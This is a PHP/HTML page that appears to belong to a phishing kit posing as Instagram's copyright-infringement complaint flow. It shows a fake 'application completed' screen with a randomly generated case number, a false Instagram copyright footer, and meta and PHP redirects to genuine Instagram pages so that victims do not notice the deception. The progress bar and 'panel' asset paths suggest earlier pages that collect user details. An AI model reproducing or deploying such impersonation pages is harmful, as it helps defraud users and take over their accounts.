<!DOCTYPE html>
<?php header("Refresh: 5; url=https://help.instagram.com/874680996209917/?helpref=search&query=telif%20hakk%C4%B1&search_session_id=9a456d0ddbfe348b45a7306bf7535675&sr=33"); ?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="refresh" content="5; url=https://www.instagram.com/oyusufcelik/">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="panel/img/head.ico">
    <title>Copyright | İnfringement</title>
    <link href="panel/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="panel/zew/css/style.css" rel="stylesheet">
</head>
<header>
		<br>
	<img style="
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-top:1.3%;
  "
  src="panel/img/head.gif" width="200px">

	</header>
		<br>
<body>
<div class="row">
    <div class="col-md-6 col-md-offset-3">
        <form id="zewform">
            <ul id="progressbar">
                <li class="active">İnformation</li>
                <li class="active">User Details</li>
                <li class="active">Copyright Reason</li>
                <li class="active">Form Status</li>
                 
           
                
            </ul>
          <div class="zewbox">
                <h2 class="fs-title">Forum Status</h2>
              
               <p style="margin-top:5px; font-weight: 600; ">Your infringement application has been successfully completed. Do not share the transaction number given to you with anyone and write your transaction number in the e-mail that will be sent within<font color="#ff000" size="2"  > 24-48 hours</font> and close the case.<p>
               <h5  style="margin-top:5px; font-weight: 600; float:left; color:#268e08;">Case Number: <font color="#000" size="2"  >#<?=rand(56735,324654) ;?><img style="width:32px;" src="panel/img/gif.gif"</font> </h5>
			    <br> <br> <br>
			   <div style="color:#268e08; font-weight: bold; font-size:12px;"><?php echo date('d.m.Y H:i:s') ?></h5></div>
                <br>
				  <a href="https://www.instagram.com/" class="btn  action-button" role="button" aria-pressed="true">Completed</a>
    </div>
   </div> 
</div>

 
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js'></script>

<script src="panel/bootstrap/js/bootstrap.min.js"></script>
<script src="panel/zew/js/zewform.js"></script>
<br><br><br><br>
<div class="footer">
  <p>© 2022 from Instagram</p>
</div>
</body>

</html>
